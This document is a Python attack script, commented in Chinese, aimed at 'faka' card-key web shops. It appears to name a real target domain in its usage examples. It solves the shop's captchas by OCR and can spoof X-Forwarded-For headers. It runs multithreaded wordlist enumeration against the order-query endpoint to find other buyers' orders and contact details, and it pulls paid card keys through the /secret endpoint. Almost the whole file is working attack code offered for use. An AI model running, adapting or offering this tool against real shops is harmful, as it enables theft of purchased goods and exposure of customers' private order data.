#!/usr/bin/env python3
"""
ACG 订单查询爆破（ddddocr 验证码）+ secret 卡密探测。

示例:
  # 订单号查询（自动 OCR 验证码）
  python3 acg_query_brute.py -u https://zhanghao9.com --keyword 903260704032647527

  # 批量联系方式
  python3 acg_query_brute.py -u https://zhanghao9.com -f keywords.txt -w 5

  # 已支付订单拉卡密（secret）
  python3 acg_query_brute.py -u https://zhanghao9.com --mode secret --order-id 903260704032647527
"""
from __future__ import annotations

import argparse
import base64
import json
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

import requests

from faka_common import DEFAULT_UA, add_pythonpath, ensure_out, json_or_text, load_wordlist, log, random_xff_headers, save_hit

CAPTCHA_PATHS = [
    "/user/captcha/image",
    "/user/api/captcha/image",
    "/captcha",
]


def get_ocr():
    add_pythonpath()
    try:
        import ddddocr

        return ddddocr.DdddOcr(show_ad=False)
    except Exception as e:
        raise SystemExit(f"ddddocr 不可用: {e}")


class Target:
    def __init__(self, base: str, timeout: int, proxy: str, use_xff: bool = False):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.use_xff = use_xff
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({"User-Agent": DEFAULT_UA})
        if use_xff:
            self.s.headers.update(random_xff_headers())

    def fetch_captcha(self) -> tuple[str, requests.Session]:
        for path in CAPTCHA_PATHS:
            url = self.base + path
            try:
                r = self.s.get(url, timeout=self.timeout, proxies=self.proxies)
                if r.status_code == 200 and r.content and len(r.content) > 100:
                    return r.content, self.s
            except Exception:
                continue
        raise RuntimeError("无法获取验证码")


def ocr_captcha(ocr, img: bytes) -> str:
    text = ocr.classification(img)
    return re.sub(r"[^a-zA-Z0-9]", "", text)[:6]


def query_order(t: Target, keyword: str, captcha: str, ocr_retries: int, ocr) -> tuple[bool, Any]:
    url = t.base + "/user/api/index/query"
    for attempt in range(ocr_retries):
        try:
            if not captcha:
                img, _ = t.fetch_captcha()
                captcha = ocr_captcha(ocr, img)
            r = t.s.post(
                url,
                data={"keywords": keyword, "captcha": captcha},
                timeout=t.timeout,
                proxies=t.proxies,
            )
            data = json_or_text(r)
            if not isinstance(data, dict):
                return False, data
            if data.get("code") == 200 and data.get("data"):
                return True, data
            msg = str(data.get("msg", ""))
            if "验证码" in msg:
                img, _ = t.fetch_captcha()
                captcha = ocr_captcha(ocr, img)
                continue
            return False, data
        except Exception as e:
            if attempt + 1 >= ocr_retries:
                return False, str(e)
            time.sleep(0.3)
    return False, {"msg": "captcha_retries_exceeded"}


def fetch_secret(t: Target, order_id: str, password: str = "") -> tuple[bool, Any]:
    url = t.base + "/user/api/index/secret"
    try:
        r = t.s.post(url, data={"orderId": order_id, "password": password}, timeout=t.timeout, proxies=t.proxies)
        data = json_or_text(r)
        if isinstance(data, dict):
            if data.get("secret") or (isinstance(data.get("data"), dict) and data["data"].get("secret")):
                return True, data
            if data.get("code") == 200:
                return True, data
        if isinstance(data, list) and data:
            return True, data
        return False, data
    except Exception as e:
        return False, str(e)


def probe_order_state(t: Target, trade_no: str) -> dict | None:
    url = t.base + "/user/api/order/state"
    try:
        r = requests.post(url, data={"tradeNo": trade_no}, timeout=t.timeout, proxies=t.proxies, verify=False,
                          headers={"User-Agent": DEFAULT_UA})
        data = json_or_text(r)
        return data if isinstance(data, dict) else None
    except Exception:
        return None


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="ACG 订单查询/secret 爆破")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--mode", choices=["query", "secret", "state"], default="query")
    ap.add_argument("--keyword", default="")
    ap.add_argument("-f", "--wordlist", default="", help="关键词列表")
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--order-id", default="", help="secret 模式订单号/trade_no")
    ap.add_argument("--password", default="")
    ap.add_argument("-w", "--workers", type=int, default=5)
    ap.add_argument("--ocr-retries", type=int, default=4)
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--proxy", default="")
    ap.add_argument("--out", default="/data/tools/faka/out/query_hits.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    t = Target(args.url, args.timeout, args.proxy, args.xff)

    if args.mode == "state":
        kw = args.keyword or args.order_id
        if not kw:
            raise SystemExit("需要 --keyword 或 --order-id")
        st = probe_order_state(t, kw)
        log(json.dumps(st, ensure_ascii=False))
        if st and st.get("code") == 200:
            save_hit(Path(args.out), "order_state", {"trade_no": kw, "data": st.get("data")})
        return

    if args.mode == "secret":
        oid = args.order_id or args.keyword
        if not oid:
            raise SystemExit("secret 模式需要 --order-id")
        ok, data = fetch_secret(t, oid, args.password)
        log(json.dumps(data, ensure_ascii=False)[:500])
        if ok:
            save_hit(Path(args.out), "secret_hit", {"order_id": oid, "data": data})
        return

    # query mode
    ocr = get_ocr()
    if args.keyword:
        keywords = [args.keyword]
    elif args.wordlist:
        keywords = list(load_wordlist(args.wordlist, offset=args.offset, limit=args.limit or None))
    else:
        raise SystemExit("query 模式需要 --keyword 或 -f")

    log(f"查询 {args.url} | keywords={len(keywords)} workers={args.workers}")

    def task(kw: str):
        sess = Target(args.url, args.timeout, args.proxy, args.xff)
        return kw, query_order(sess, kw, "", args.ocr_retries, ocr)

    hits = 0
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(task, kw): kw for kw in keywords}
        for fut in as_completed(futs):
            kw, (ok, data) = fut.result()
            if ok:
                hits += 1
                save_hit(Path(args.out), "query_hit", {"keyword": kw, "orders": data.get("data")})
                log(f"[+] QUERY {kw} -> {json.dumps(data.get('data'), ensure_ascii=False)[:300]}")
            else:
                msg = data.get("msg") if isinstance(data, dict) else str(data)[:120]
                log(f"[-] {kw} -> {msg}")

    log(f"完成 hits={hits} -> {args.out}")


if __name__ == "__main__":
    main()
